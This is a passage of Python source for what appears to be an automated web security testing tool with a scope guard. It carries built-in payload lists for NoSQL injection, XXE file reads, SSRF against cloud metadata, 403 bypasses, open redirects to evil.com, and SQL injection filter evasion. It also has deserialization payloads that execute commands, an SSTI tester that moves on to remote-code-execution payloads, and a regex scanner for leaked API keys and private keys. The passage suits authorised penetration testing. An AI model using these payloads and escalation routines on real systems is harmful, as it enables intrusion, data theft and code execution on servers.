            '{"username": "admin", "password": {"$gt": ""}}',
            '{"username": "admin", "password": {"$regex": ".*"}}',
            '{"username": {"$ne": ""}, "password": {"$ne": ""}}',
            '{"username": {"$regex": "^admin"}, "password": {"$ne": ""}}',
        ],
        "xxe-payloads": [
            # Basic XXE file read
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///FLAG">]><root>&xxe;</root>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///FLAG.txt">]><root>&xxe;</root>',
            # Parameter entity (for blind XXE)
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><root>test</root>',
            # XInclude (when DOCTYPE not allowed)
            '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>',
            '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///FLAG"/></foo>',
            # SVG XXE
            '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>',
            # SSRF via XXE
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1">]><root>&xxe;</root>',
            # PHP expect wrapper
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><root>&xxe;</root>',
            # Encoding bypass
            '<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
        ],
        "403-bypass-paths": [
            # Path normalization tricks (use with base path)
            "/./", "//", "/.//", "/..;/", "/%2e/", "/%2e%2e/", "/%252e/",
            "%2f", "%2F", "%2e%2e%2f", "%252e%252e%252f",
            # Trailing characters
            "/", "//", ".", "..", ";", "%23", "?", ".json", ".html", ".css", ".js",
            "%00", "%0a", "%0d", "%09", "%20",
            # Case variations (appended to path)
            # Verb override headers (tested as headers, not paths)
            # URL encoding variants
            "%2e%2e/", "..%2f", "..;/", "..\\/",
            # Double encoding
            "%252e%252e/", "%252e%252e%252f",
            # Nginx specific
            "..;/", "/..;/..;/",
            # Spring Boot specific
            ";/", ";foo/", ";.css",
            # Unicode/overlong encoding
            "..%c0%af", "..%ef%bc%8f", "..%c1%9c",
            # Null byte + extension
            "%00.jpg", "%00.html", "%00.css",
            # Hop-by-hop header abuse (tested via headers)
            # Various path constructions
            "./", ".//", "..//", ".;/", "..;/",
            # IIS specific
            "::$DATA", ":$DATA",
            # Tab and space
            "%09", "%20", "+",
        ],
        "open-redirect-payloads": [
            "//evil.com", "/\\evil.com", "//evil.com/", "///evil.com",
            "////evil.com", "https://evil.com", "http://evil.com",
            "/\\/evil.com", "/.evil.com", "///evil.com/%2f..",
            "@evil.com", "?next=//evil.com", "?url=//evil.com",
            "%2f%2fevil.com", "%2F%2Fevil.com", "%5cevil.com",
            "//evil%00.com", "//evil.com%23", "//evil.com%40target.com",
            "/redirect?url=//evil.com", "//evil.com\\@target.com",
            "https:evil.com", "http:evil.com",
            "////evil.com//", "\\\\evil.com",
            "evil.com", ".evil.com",
        ],
        "header-bypass": [
            # IP spoofing headers (values tested: 127.0.0.1, localhost, internal IPs)
            "X-Forwarded-For: 127.0.0.1", "X-Real-IP: 127.0.0.1",
            "X-Originating-IP: 127.0.0.1", "X-Remote-IP: 127.0.0.1",
            "X-Remote-Addr: 127.0.0.1", "X-Client-IP: 127.0.0.1",
            "True-Client-IP: 127.0.0.1", "CF-Connecting-IP: 127.0.0.1",
            "X-Forwarded-For: localhost", "X-Forwarded-For: 10.0.0.1",
            "X-Forwarded-For: 192.168.1.1", "X-Forwarded-For: 172.16.0.1",
            # URL rewrite headers
            "X-Original-URL: /admin", "X-Rewrite-URL: /admin",
            "X-Forwarded-Host: localhost", "X-Host: localhost",
            # Method override headers
            "X-HTTP-Method-Override: PUT", "X-HTTP-Method: DELETE",
            "X-Method-Override: PATCH",
        ],
        "deserialization-payloads": [
            # PHP serialized objects
            'O:8:"stdClass":0:{}',
            'a:1:{s:4:"test";s:4:"test";}',
            'O:17:"__PHP_Incomplete_Class":0:{}',
            # Java serialized (base64)
            "rO0ABXNyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAAA",
            # Node.js node-serialize
            '{"rce":"_$$ND_FUNC$$_function(){return require(\'child_process\').execSync(\'id\').toString()}()"}',
            # Python pickle (base64 encoded)
            "gASVKAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAJpZJSFlFKULg==",
            # YAML unsafe
            "!!python/object/apply:os.system ['id']",
            '!!python/object/new:subprocess.check_output [["id"]]',
        ],
        "s3-buckets": [
            # Common S3/storage bucket names
            "assets", "backups", "backup", "uploads", "upload", "data", "files",
            "images", "img", "static", "private", "public", "logs", "media",
            "documents", "docs", "attachments", "storage", "content", "temp",
            "tmp", "cache", "config", "configs", "db", "database", "dumps",
            "export", "exports", "import", "imports", "archive", "archives",
            "old", "test", "dev", "staging", "prod", "production",
            "secrets", "keys", "certs", "certificates", "internal",
        ],
        "sqli-filter-bypass": [
            # No-space SQLi (use /**/ or %09 or %0a)
            "'/**/OR/**/1=1--", "'/**/OR/**/'1'='1'--",
            "'%09OR%091=1--", "'%0aOR%0a1=1--",
            "'+OR+1=1--", "'\tOR\t1=1--",
            # Alternative logical operators
            "'||1=1--", "'||'1'='1'--",
            "1'||1#", "1'||1--+-",
            # Comment-based bypass
            "admin'--", "admin'#", "admin'/*",
            "'OR/**/1=1#", "'OR/**/1=1--+-",
            # UNION with no spaces
            "'/**/UNION/**/SELECT/**/NULL--",
            "'/**/UNION/**/SELECT/**/NULL,NULL--",
            "'/**/UNION/**/SELECT/**/NULL,NULL,NULL--",
            # Keyword alternative bypass (no AND/WHERE/LIKE)
            "'||1=1||'", "1'||1||'1",
            "'||(SELECT/**/1)='1",
            # Case bypass
            "'oR 1=1--", "'Or 1=1--", "'OR 1=1--",
            # Double URL encoding
            "%2527%2520OR%25201%253D1--",
            # Char-based bypass (avoid keyword blacklists)
            "' OR CHAR(49)=CHAR(49)--",
            "' OR 1 BETWEEN 1 AND 1--",
            "' OR 1 IN (1)--",
            "' OR 1 REGEXP 1--",
            "' OR 1 RLIKE 1--",
            # Error-based extraction (no WHERE/LIMIT/SUBSTRING/SUBSTR)
            "' OR EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
            "' OR UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1)--",
            # Blind boolean without AND/WHERE
            "' OR IF(1=1,1,0)--",
            "' OR IF(1=2,1,0)--",
            "' OR CASE WHEN 1=1 THEN 1 ELSE 0 END--",
        ],
    }

    def __init__(self, scope_guard: ActiveScopeGuard | None, timeout: int = 120,
                 socks_proxy: str | None = None):
        self._scope_guard = scope_guard
        self._timeout = timeout
        self._socks_proxy = socks_proxy

    async def fuzz(
        self,
        url_template: str,
        wordlist: str | list[str],
        method: str = "GET",
        headers: dict | None = None,
        body_template: str | None = None,
        match_status: list[int] | None = None,
        filter_status: list[int] | None = None,
        match_contains: str | None = None,
        filter_contains: str | None = None,
        match_length_range: tuple[int, int] | list[int] | None = None,
        max_requests: int = 500,
        rate_limit: float = 1.0,
        **kwargs: Any,
    ) -> dict[str, Any]:
        """Run wordlist-based fuzzing.

        Args:
            url_template: URL with {FUZZ} placeholder.
            wordlist: Built-in wordlist name or custom list.
            method: HTTP method (default GET).
            headers: Custom headers.
            body_template: Body with {FUZZ} placeholder.
            match_status: Status codes to include.
            filter_status: Status codes to exclude.
            match_contains: Include if response contains this.
            filter_contains: Exclude if response contains this.
            match_length_range: [min, max] length to include.
            max_requests: Max requests (default 500).
            rate_limit: Seconds between requests (default 0.05).

        Returns:
            {total_requests, matches, errors}
        """
        # Resolve wordlist
        if isinstance(wordlist, str):
            words = self.BUILTIN_WORDLISTS.get(wordlist)
            if words is None:
                return {"error": f"Unknown wordlist: {wordlist}. Available: {list(self.BUILTIN_WORDLISTS)}"}
        else:
            words = list(wordlist)

        # Limit
        words = words[:max_requests]

        # Validate base URL scope
        test_url = url_template.replace("{FUZZ}", "test")
        if self._scope_guard:
            self._scope_guard.validate_url(test_url)

        matches: list[dict[str, Any]] = []
        errors = 0
        start_time = time.monotonic()

        async with _make_client(
            socks_proxy=self._socks_proxy, timeout=15, follow_redirects=True,
        ) as client:
            for i, word in enumerate(words):
                if time.monotonic() - start_time > self._timeout:
                    break

                url = url_template.replace("{FUZZ}", word)
                body = body_template.replace("{FUZZ}", word) if body_template else None

                await asyncio.sleep(rate_limit)

                try:
                    resp = await client.request(
                        method, url, headers=headers or {}, content=body,
                    )
                except Exception:
                    errors += 1
                    continue

                # Apply filters
                status = resp.status_code
                length = len(resp.content)
                body_text = resp.text

                if filter_status and status in filter_status:
                    continue
                if match_status and status not in match_status:
                    continue
                if filter_contains and filter_contains in body_text:
                    continue
                if match_contains and match_contains not in body_text:
                    continue
                if match_length_range:
                    lr = list(match_length_range)
                    if length < lr[0] or length > lr[1]:
                        continue

                matches.append({
                    "word": word,
                    "status": status,
                    "length": length,
                    "snippet": body_text[:200],
                })

                logger.debug("fuzz_match", word=word, status=status, length=length)

        return {
            "total_requests": len(words),
            "matches": matches[:100],  # Cap at 100 matches
            "errors": errors,
            "elapsed_seconds": round(time.monotonic() - start_time, 1),
        }


# ── JS Bundle Secret Scanner ─────────────────────────────────────────

class SecretScanner:
    """Scan JS bundles and text for secrets, API keys, internal URLs.

    Zero LLM cost — pure regex matching against 20+ secret patterns.
    """

    _PATTERNS: list[tuple[str, re.Pattern]] = [
        ("aws_access_key", re.compile(r'AKIA[0-9A-Z]{16}')),
        ("aws_secret_key", re.compile(r'(?:aws_secret|secret_access)[_\s]*(?:key)?["\s:=]+([0-9a-zA-Z/+=]{40})', re.I)),
        ("github_token", re.compile(r'gh[ps]_[A-Za-z0-9_]{36,}')),
        ("stripe_secret", re.compile(r'sk_live_[0-9a-zA-Z]{24,}')),
        ("stripe_publishable", re.compile(r'pk_live_[0-9a-zA-Z]{24,}')),
        ("google_api_key", re.compile(r'AIzaSy[0-9A-Za-z\-_]{33}')),
        ("firebase_key", re.compile(r'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}')),
        ("jwt_token", re.compile(r'eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]*')),
        ("private_key", re.compile(r'-----BEGIN (?:RSA |DSA |EC |OPENSSH )?PRIVATE KEY-----')),
        ("slack_token", re.compile(r'xox[bpors]-[0-9a-zA-Z-]{10,}')),
        ("slack_webhook", re.compile(r'https://hooks\.slack\.com/services/T[A-Z0-9]+/B[A-Z0-9]+/[a-zA-Z0-9]+')),
        ("twilio_key", re.compile(r'SK[0-9a-fA-F]{32}')),
        ("sendgrid_key", re.compile(r'SG\.[0-9A-Za-z\-_]{22}\.[0-9A-Za-z\-_]{43}')),
        ("heroku_api", re.compile(r'[hH]eroku.*[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}')),
        ("mailgun_key", re.compile(r'key-[0-9a-zA-Z]{32}')),
        ("square_token", re.compile(r'sq0[a-z]{3}-[0-9A-Za-z\-_]{22,}')),
        ("internal_url", re.compile(r'https?://(?:internal|staging|dev|admin|api-internal|localhost|127\.0\.0\.1)[.\-:][^\s"\'<>]{3,80}', re.I)),
        ("source_map", re.compile(r'//[#@]\s*sourceMappingURL=\S+')),
        ("graphql_op", re.compile(r'(?:query|mutation|subscription)\s+([A-Z]\w{2,})\s*[\({]', re.I)),
        ("debug_route", re.compile(r'["\'](/(?:debug|_internal|actuator|__debug__|phpinfo|elmah|trace|server-status)[/"\'])', re.I)),
        ("hardcoded_password", re.compile(r'(?:password|passwd|pwd|secret)\s*[:=]\s*["\']([^"\']{4,50})["\']', re.I)),
        ("api_endpoint", re.compile(r'["\']((?:/api/|/v[0-9]+/|/graphql|/rest/)[^\s"\'<>]{2,80})["\']')),
        ("admin_path", re.compile(r'["\'](/(?:admin|manage|dashboard|panel|backoffice|cms)[^\s"\'<>]{0,60})["\']', re.I)),
    ]

    def scan(self, text: str) -> dict[str, list[dict[str, Any]]]:
        """Scan text for secrets and interesting patterns.

        Returns dict with keys: secrets, api_endpoints, internal_urls,
        graphql_ops, source_maps, debug_routes, admin_paths.
        """
        results: dict[str, list[dict[str, Any]]] = {
            "secrets": [],
            "api_endpoints": [],
            "internal_urls": [],
            "graphql_ops": [],
            "source_maps": [],
            "debug_routes": [],
            "admin_paths": [],
        }
        seen: set[str] = set()

        for pattern_name, pattern in self._PATTERNS:
            for match in pattern.finditer(text):
                value = match.group(1) if match.lastindex else match.group(0)
                # Dedup
                dedup_key = f"{pattern_name}:{value[:50]}"
                if dedup_key in seen:
                    continue
                seen.add(dedup_key)

                entry = {
                    "type": pattern_name,
                    "value": value[:200],
                    "position": match.start(),
                    "context": text[max(0, match.start() - 30):match.end() + 30][:120],
                }

                # Route to correct category
                if pattern_name in ("api_endpoint",):
                    results["api_endpoints"].append(entry)
                elif pattern_name in ("internal_url",):
                    results["internal_urls"].append(entry)
                elif pattern_name in ("graphql_op",):
                    results["graphql_ops"].append(entry)
                elif pattern_name in ("source_map",):
                    results["source_maps"].append(entry)
                elif pattern_name in ("debug_route",):
                    results["debug_routes"].append(entry)
                elif pattern_name in ("admin_path",):
                    results["admin_paths"].append(entry)
                else:
                    results["secrets"].append(entry)

        return results


# ── SSRF Tester ──────────────────────────────────────────────────────

class SSRFTester:
    """Test URL-accepting parameters for SSRF — zero LLM cost.

    Tests IP bypass techniques, cloud metadata, protocol schemes,
    and response analysis.
    """

    _PAYLOADS = [
        # Localhost variants
        ("localhost", "http://127.0.0.1"),
        ("localhost_hex", "http://0x7f000001"),
        ("localhost_decimal", "http://2130706433"),
        ("localhost_ipv6", "http://[::1]"),
        ("localhost_ipv6_short", "http://[0:0:0:0:0:0:0:1]"),
        ("localhost_octal", "http://0177.0.0.1"),
        ("localhost_zero", "http://0.0.0.0"),
        # Cloud metadata
        ("aws_metadata", "http://169.254.169.254/latest/meta-data/"),
        ("aws_metadata_dns", "http://instance-data.ec2.internal/latest/meta-data/"),
        ("gcp_metadata", "http://metadata.google.internal/computeMetadata/v1/"),
        ("azure_metadata", "http://169.254.169.254/metadata/instance?api-version=2021-02-01"),
        # Protocol schemes
        ("file_etc_passwd", "file:///etc/passwd"),
        ("file_etc_hosts", "file:///etc/hosts"),
        # Internal services on common ports
        ("internal_3000", "http://127.0.0.1:3000"),
        ("internal_5000", "http://127.0.0.1:5000"),
        ("internal_8080", "http://127.0.0.1:8080"),
        ("internal_6379", "http://127.0.0.1:6379"),  # Redis
        ("internal_9200", "http://127.0.0.1:9200"),  # Elasticsearch
    ]

    _METADATA_INDICATORS = [
        "ami-id", "instance-id", "instance-type", "local-hostname",
        "public-hostname", "public-ipv4", "security-credentials",
        "iam/info", "computeMetadata", "azureprofile",
    ]

    _INTERNAL_INDICATORS = [
        "root:x:0:0:", "/etc/passwd", "localhost", "127.0.0.1",
        "<html", "<!DOCTYPE", "Welcome", "Dashboard",
    ]

    def __init__(self, scope_guard: ActiveScopeGuard | None, timeout: int = 10,
                 socks_proxy: str | None = None):
        self._scope_guard = scope_guard
        self._timeout = timeout
        self._client = _make_client(
            socks_proxy=socks_proxy, timeout=timeout, follow_redirects=True,
        )

    async def test(
        self,
        url: str,
        param: str,
        method: str = "GET",
        cookies: dict[str, str] | None = None,
        headers: dict[str, str] | None = None,
        body: dict[str, Any] | None = None,
    ) -> dict[str, Any]:
        """Test a parameter for SSRF with multiple payload techniques."""
        results = []
        successful = []

        # First, get a baseline response for comparison
        baseline_resp = None
        try:
            if method.upper() == "GET":
                baseline_resp = await self._client.get(
                    url, params={param: "https://example.com"},
                    cookies=cookies, headers=headers,
                )
            else:
                send_body = dict(body) if body else {}
                send_body[param] = "https://example.com"
                baseline_resp = await self._client.post(
                    url, data=send_body, cookies=cookies, headers=headers,
                )
        except Exception:
            pass

        baseline_len = len(baseline_resp.text) if baseline_resp else 0

        for label, payload in self._PAYLOADS:
            try:
                if method.upper() == "GET":
                    resp = await self._client.get(
                        url, params={param: payload},
                        cookies=cookies, headers=headers,
                    )
                else:
                    send_body = dict(body) if body else {}
                    send_body[param] = payload
                    resp = await self._client.post(
                        url, data=send_body, cookies=cookies, headers=headers,
                    )

                body_text = resp.text[:5000]
                is_interesting = False
                evidence_details = []

                # Check for metadata indicators
                for indicator in self._METADATA_INDICATORS:
                    if indicator in body_text:
                        is_interesting = True
                        evidence_details.append(f"metadata indicator: {indicator}")

                # Check for internal content indicators
                for indicator in self._INTERNAL_INDICATORS:
                    if indicator in body_text:
                        is_interesting = True
                        evidence_details.append(f"internal content: {indicator}")

                # Check for significant response length difference
                if baseline_len > 0 and abs(len(resp.text) - baseline_len) > 200:
                    is_interesting = True
                    evidence_details.append(
                        f"response length diff: {len(resp.text)} vs baseline {baseline_len}"
                    )

                result_entry = {
                    "payload": label,
                    "url_sent": payload,
                    "status_code": resp.status_code,
                    "response_length": len(resp.text),
                    "interesting": is_interesting,
                }
                if evidence_details:
                    result_entry["evidence"] = evidence_details
                if is_interesting:
                    result_entry["response_preview"] = body_text[:500]
                    successful.append(result_entry)

                results.append(result_entry)

            except Exception as e:
                results.append({
                    "payload": label,
                    "url_sent": payload,
                    "error": str(e)[:100],
                })

        return {
            "vulnerable": len(successful) > 0,
            "payloads_tested": len(results),
            "successful_payloads": successful,
            "evidence": "; ".join(
                f"{s['payload']}: {', '.join(s.get('evidence', []))}"
                for s in successful
            ) if successful else "No SSRF indicators detected",
            "all_results": results[:10],  # Cap for token savings
        }

    async def close(self):
        await self._client.aclose()


# ── SSTI Tester ──────────────────────────────────────────────────────

class SSTITester:
    """Test parameters for Server-Side Template Injection — zero LLM cost.

    Tests polyglot probes, fingerprints template engine, and escalates
    to RCE payloads when confirmed.
    """

    _PROBES = [
        ("jinja2_math", "{{7*7}}", "49"),
        ("jinja2_string", "{{7*'7'}}", "7777777"),
        ("twig_math", "{{7*7}}", "49"),
        ("freemarker_math", "${7*7}", "49"),
        ("mako_math", "${7*7}", "49"),
        ("erb_math", "<%= 7*7 %>", "49"),
        ("pebble_math", "{{7*7}}", "49"),
        ("velocity_math", "#set($x=7*7)${x}", "49"),
        ("smarty_math", "{7*7}", "49"),
        ("nunjucks_math", "{{7*7}}", "49"),
        ("polyglot_1", "${{<%[%'\"}}%\\.", None),  # Detect via error
    ]

    _ENGINE_FINGERPRINTS = {
        "7777777": "Jinja2",
        "49_from_dollar": "Freemarker/Mako",
        "49_from_erb": "ERB (Ruby)",
        "49_from_curly": "Twig/Jinja2/Nunjucks/Pebble",
    }

    _RCE_PAYLOADS: dict[str, list[tuple[str, str]]] = {
        "Jinja2": [
            ("rce_config", "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"),
            ("rce_mro", "{{''.__class__.__mro__[1].__subclasses__()}}"),
        ],
        "Twig": [
            ("rce_filter", "{{['id']|filter('system')}}"),
        ],
        "Freemarker": [
            ("rce_exec", "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}"),
        ],
        "ERB (Ruby)": [
            ("rce_system", "<%= system('id') %>"),
        ],
    }

    def __init__(self, scope_guard: ActiveScopeGuard | None, timeout: int = 10,
                 socks_proxy: str | None = None):
        self._scope_guard = scope_guard
        self._timeout = timeout
        self._client = _make_client(
            socks_proxy=socks_proxy, timeout=timeout, follow_redirects=True,
        )

    async def test(
        self,
        url: str,
        param: str,
        method: str = "GET",
        cookies: dict[str, str] | None = None,
        headers: dict[str, str] | None = None,
        body: dict[str, Any] | None = None,
    ) -> dict[str, Any]:
        """Test a parameter for SSTI with multiple template engine probes."""
        confirmed = False
        engine = "unknown"
        confirmed_payload = ""
        evidence_text = ""
        probes_tested = 0
        rce_results = []

        for label, probe, expected in self._PROBES:
            probes_tested += 1
            try:
                if method.upper() == "GET":
                    resp = await self._client.get(
                        url, params={param: probe},
                        cookies=cookies, headers=headers,
                    )
                else:
                    send_body = dict(body) if body else {}
                    send_body[param] = probe
                    resp = await self._client.post(
                        url, data=send_body, cookies=cookies, headers=headers,
                    )

                body_text = resp.text

                if expected and expected in body_text:
                    confirmed = True
                    confirmed_payload = probe

                    # Fingerprint the engine
                    if expected == "7777777":
                        engine = "Jinja2"
                    elif expected == "49":
                        if "${" in probe:
                            engine = "Freemarker/Mako"
                        elif "<%=" in probe:
                            engine = "ERB (Ruby)"
                        elif "{{" in probe:
                            engine = "Jinja2/Twig/Nunjucks"

                    evidence_text = (
                        f"SSTI confirmed: probe '{probe}' returned '{expected}' "
                        f"in response. Engine: {engine}. "
                        f"HTTP {resp.status_code}, response snippet: {body_text[:300]}"
                    )
                    break

                # Check for template error (polyglot probe)
                if expected is None:
                    error_indicators = [
                        "TemplateSyntaxError", "Template error", "UndefinedError",
                        "ParseException", "freemarker", "twig", "jinja2",
                        "ERB", "SyntaxError", "template",
                    ]
                    if any(ind.lower() in body_text.lower() for ind in error_indicators):
                        evidence_text = (
                            f"Template error triggered by polyglot probe. "
                            f"HTTP {resp.status_code}, error snippet: {body_text[:500]}"
                        )

            except Exception:
                continue

        # If confirmed, try RCE escalation
        if confirmed and engine != "unknown":
            rce_payloads = self._RCE_PAYLOADS.get(engine, [])
            for rce_label, rce_payload in rce_payloads:
                try:
                    if method.upper() == "GET":
                        resp = await self._client.get(
                            url, params={param: rce_payload},
                            cookies=cookies, headers=headers,
                        )
                    else:
                        send_body = dict(body) if body else {}
                        send_body[param] = rce_payload
                        resp = await self._client.post(
                            url, data=send_body, cookies=cookies, headers=headers,
                        )

                    if "uid=" in resp.text or "root:" in resp.text:
                        rce_results.append({
                            "label": rce_label,
                            "payload": rce_payload,
                            "output": resp.text[:500],
                            "rce_confirmed": True,
                        })
                    else:
                        rce_results.append({
                            "label": rce_label,
                            "payload": rce_payload,
                            "output": resp.text[:200],
                            "rce_confirmed": False,
                        })
                except Exception as e:
                    rce_results.append({"label": rce_label, "error": str(e)[:100]})

        return {
            "vulnerable": confirmed,
            "engine": engine,
            "probes_tested": probes_tested,
            "confirmed_payload": confirmed_payload,
            "evidence": evidence_text or "No SSTI indicators detected",
            "rce_escalation": rce_results if rce_results else None,
            "template_error_detected": bool(evidence_text and not confirmed),
        }

    async def close(self):
        await self._client.aclose()


# ── Race Condition Tester ────────────────────────────────────────────

class RaceConditionTester:
    """Fire concurrent identical requests to detect race conditions.

    Zero LLM cost — pure async HTTP.
    """

    def __init__(self, scope_guard: ActiveScopeGuard | None, timeout: int = 15,
                 socks_proxy: str | None = None):
        self._scope_guard = scope_guard
        self._timeout = timeout
        self._socks_proxy = socks_proxy

    async def test(
        self,
        url: str,
        method: str = "POST",
        body: dict[str, Any] | str | None = None,
        headers: dict[str, str] | None = None,
        cookies: dict[str, str] | None = None,
        concurrent_requests: int = 20,
    ) -> dict[str, Any]:
        """Fire N identical requests simultaneously and analyze results."""
        _race_socks = self._socks_proxy

        async def _send_one(idx: int) -> dict[str, Any]:
            async with _make_client(
                socks_proxy=_race_socks, timeout=self._timeout,
            ) as client:
                start = time.time()
                try:
                    kwargs: dict[str, Any] = {"headers": headers, "cookies": cookies}
                    if isinstance(body, dict):
                        kwargs["data"] = body
                    elif isinstance(body, str):
                        kwargs["content"] = body

                    resp = await getattr(client, method.lower())(url, **kwargs)
                    elapsed = time.time() - start
                    return {
                        "index": idx,
                        "status_code": resp.status_code,
                        "response_length": len(resp.text),
                        "elapsed_ms": int(elapsed * 1000),
                        "preview": resp.text[:200],
                    }
                except Exception as e:
                    elapsed = time.time() - start
                    return {
                        "index": idx,
                        "error": str(e)[:100],
                        "elapsed_ms": int(elapsed * 1000),
                    }

        # Fire all requests simultaneously
        tasks = [_send_one(i) for i in range(concurrent_requests)]
        results = await asyncio.gather(*tasks)

        # Analyze results
        success_results = [r for r in results if "status_code" in r]
        status_codes = [r["status_code"] for r in success_results]
        unique_statuses = set(status_codes)
        response_lengths = [r["response_length"] for r in success_results]
        unique_lengths = set(response_lengths)
        successes_2xx = [r for r in success_results if 200 <= r["status_code"] < 300]
        response_times = [r["elapsed_ms"] for r in results if "elapsed_ms" in r]

        # Detect race condition indicators
        race_detected = False
        indicators = []

        # Multiple 2xx responses for a single-use operation
        if len(successes_2xx) > 1:
            indicators.append(f"{len(successes_2xx)} successful (2xx) responses out of {concurrent_requests}")

        # Highly varied response bodies suggest non-atomic processing
        if len(unique_lengths) > 3 and len(success_results) > 5:
            indicators.append(f"{len(unique_lengths)} different response lengths detected")

        # All succeeded with same status — suspicious for limited-use operations
        if len(unique_statuses) == 1 and len(successes_2xx) == concurrent_requests:
            indicators.append(f"All {concurrent_requests} requests returned same 2xx status")
            race_detected = True

        return {
            "total_sent": concurrent_requests,
            "total_succeeded": len(successes_2xx),
            "unique_status_codes": sorted(unique_statuses),
            "unique_response_lengths": len(unique_lengths),
            "response_times_ms": {
                "min": min(response_times) if response_times else 0,
                "max": max(response_times) if response_times else 0,
                "avg": int(sum(response_times) / len(response_times)) if response_times else 0,
            },
            "race_detected": race_detected,
            "indicators": indicators,
            "sample_responses": results[:5],
        }


# ── GraphQL Analyzer ─────────────────────────────────────────────────

def _infer_graphql_value(name: str, type_name: str) -> str:
    """Infer a plausible dummy value for a GraphQL arg based on name and type."""
    name_lower = name.lower()
    # Name-based inference (takes priority)
    if "email" in name_lower:
        return '"test@test.com"'
    if "password" in name_lower or "passwd" in name_lower:
        return '"test123"'
    if "code" in name_lower or "otp" in name_lower or "pin" in name_lower:
        return '"000000"'
    if "phone" in name_lower or "mobile" in name_lower:
        return '"+1234567890"'
    if "url" in name_lower or "link" in name_lower or "uri" in name_lower:
        return '"https://example.com"'
    if "amount" in name_lower or "price" in name_lower or "quantity" in name_lower:
        return "1"
    if "enabled" in name_lower or "active" in name_lower or "confirm" in name_lower:
        return "true"
    # Type-based inference
    type_upper = (type_name or "").upper()
    if type_upper in ("INT", "INTEGER", "FLOAT", "DECIMAL", "NUMBER"):
        return "1"
    if type_upper in ("BOOLEAN", "BOOL"):
        return "true"
    if type_upper == "ID":
        return '"1"'
    return '"test"'


def _build_graphql_dummy_args(args: list[dict]) -> str:
    """Build dummy arg string for GraphQL mutation testing.

    Args: list of dicts with name, type_name, type_kind, of_type_name.
    Returns formatted arg string like: email: "test@test.com", password: "test123"
    """
    if not args:
        return ""
    parts = []
    for arg in args[:5]:  # Cap at 5 args to avoid over-complex queries
        name = arg.get("name", "")
        type_kind = arg.get("type_kind", "")
        # Resolve the actual scalar type name (NON_NULL wraps the real type)
        actual_type = arg.get("of_type_name") or arg.get("type_name") or "String"
        # INPUT_OBJECT types need nested fields — skip (too complex for blind testing)
        if actual_type and actual_type[0].isupper() and actual_type not in (
            "String", "Int", "Float", "Boolean", "ID",
        ) and type_kind != "NON_NULL":
            continue
        # For NON_NULL INPUT_OBJECT, also skip
        of_type_name = arg.get("of_type_name", "")
        if of_type_name and of_type_name[0].isupper() and of_type_name not in (
            "String", "Int", "Float", "Boolean", "ID",
        ):
            continue
        val = _infer_graphql_value(name, actual_type)
        parts.append(f"{name}: {val}")
    return ", ".join(parts)


class GraphQLAnalyzer:
    """Analyze GraphQL endpoints for misconfigurations — zero LLM cost.

    Tests introspection, enumerates mutations/queries, checks auth.
    """

    _INTROSPECTION_QUERY = """
    query IntrospectionQuery {
      __schema {
        queryType { name }
        mutationType { name }
        types {
          name
          kind
          fields {
            name
            args { name type { name kind ofType { name kind } } }
            type { name kind ofType { name kind } }
          }
        }
      }
    }
    """

    def __init__(self, scope_guard: ActiveScopeGuard | None, timeout: int = 15,
                 socks_proxy: str | None = None):
        self._scope_guard = scope_guard
        self._timeout = timeout
        self._client = _make_client(
            socks_proxy=socks_proxy, timeout=timeout,
        )

    async def analyze(
        self,
        url: str,
        cookies: dict[str, str] | None = None,
        headers: dict[str, str] | None = None,
    ) -> dict[str, Any]:
        """Analyze a GraphQL endpoint."""
        gql_headers = {"Content-Type": "application/json"}
        if headers:
            gql_headers.update(headers)

        # Step 1: Test introspection
        schema_available = False
        mutations = []
        queries = []
        all_types = []

        try:
            resp = await self._client.post(
                url,
                json={"query": self._INTROSPECTION_QUERY},
                headers=gql_headers,
                cookies=cookies,
            )
            data = resp.json()
            if "data" in data and data["data"].get("__schema"):
                schema_available = True
                schema = data["data"]["__schema"]

                # Extract types
                for t in schema.get("types", []):
                    name = t.get("name", "")
                    if name.startswith("__"):
                        continue  # Skip introspection types
                    kind = t.get("kind", "")
                    fields = t.get("fields") or []

                    type_info = {
                        "name": name,
                        "kind": kind,
                        "fields": [
                            {
                                "name": f["name"],
                                "args": [a["name"] for a in (f.get("args") or [])],
                            }
                            for f in fields[:20]
                        ],
                    }
                    all_types.append(type_info)

                    # Categorize as query or mutation
                    query_type_name = (schema.get("queryType") or {}).get("name", "Query")
                    mutation_type_name = (schema.get("mutationType") or {}).get("name", "Mutation")

                    if name == query_type_name:
                        for f in fields:
                            queries.append({
                                "name": f["name"],
                                "args": [a["name"] for a in (f.get("args") or [])],
                            })
                    elif name == mutation_type_name:
                        for f in fields:
                            mutations.append({
                                "name": f["name"],
                                "args": [
